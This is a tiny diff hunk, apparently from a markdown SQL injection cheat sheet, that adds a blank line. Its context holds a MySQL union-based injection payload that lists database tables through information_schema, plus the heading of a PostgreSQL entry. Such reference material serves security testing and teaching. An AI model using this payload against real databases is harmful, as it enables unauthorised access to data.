@@ -106,6 +106,7 @@
 - Retreive tables
 
 1.  Mysql
+    
     union select group_concat(table_name) from information_schema.tables 
 		
 3. PostgreSQL
